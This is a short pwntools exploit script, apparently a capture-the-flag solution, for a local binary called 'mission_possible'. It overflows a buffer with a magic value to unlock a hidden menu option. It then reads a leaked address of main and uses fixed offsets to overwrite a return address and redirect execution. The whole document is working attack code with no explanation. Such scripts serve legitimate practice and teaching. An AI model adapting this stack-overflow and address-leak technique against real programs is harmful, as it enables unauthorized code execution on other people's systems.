from pwn import *

exe = ELF("./mission_possible", checksec=False)
p = process(exe.path)

p.sendlineafter('>>', '1')

payload = b'A' * 64
payload += p64(0xDEADBEEFDEADBEEF)
p.sendlineafter('text', payload)

p.sendlineafter('>>', '1337')

leak_main = p.recvline_contains(':').strip().split(b' ')[-1]

p.sendlineafter('>>', '2')

payload =  b'A' * 72
payload += p64(int(leak_main, 16) - 0x1289 + 0x1531)

print(hex(int(leak_main, 16) - 0x1289 + 0x1531))

p.sendlineafter(': ', payload)

output = p.recvall().decode(errors="ignore")
print(output)